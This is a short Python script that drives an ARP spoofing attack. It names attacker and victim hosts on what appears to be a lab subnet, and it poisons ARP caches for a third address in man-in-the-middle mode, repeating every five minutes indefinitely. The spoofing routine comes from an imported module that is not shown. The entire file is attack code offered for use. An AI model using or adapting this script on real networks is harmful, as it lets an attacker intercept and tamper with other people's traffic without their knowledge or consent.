from ARP import ARP
from classes.User import User
import time

def ARPSpoof(n_times = 0):
    attacker = User('192.168.56.103')
    attacker.get_mac()
    victim = User('192.168.56.101')
    victim.get_mac()
    arp = ARP(attacker, victim, '192.168.56.102')
    if n_times <= 0:
        while True:
            arp.spoof(mitm=True)
            time.sleep(300)
    else:
        arp.spoof()


if __name__ == '__main__':
    ARPSpoof()